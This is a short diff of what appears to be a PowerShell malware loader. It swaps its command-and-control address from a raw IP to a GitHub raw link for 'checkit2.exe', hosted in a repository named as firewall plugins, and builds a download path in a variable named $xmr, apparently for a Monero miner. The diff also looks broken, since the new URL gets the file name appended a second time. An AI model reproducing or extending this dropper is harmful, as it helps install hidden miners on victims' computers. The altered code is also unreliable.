@@ -1,4 +1,4 @@
-$cc = "http://89.34.27.167"
+$cc = "https://github.com/c4kroot/Plugins-Files-for-Firewall/raw/main/checkit2.exe"
 $is64 = (([Array](Get-WmiObject -Query "select AddressWidth from Win32_Processor"))[0].AddressWidth -eq 64)
 $xmr = "$cc/checkit2.exe"
 
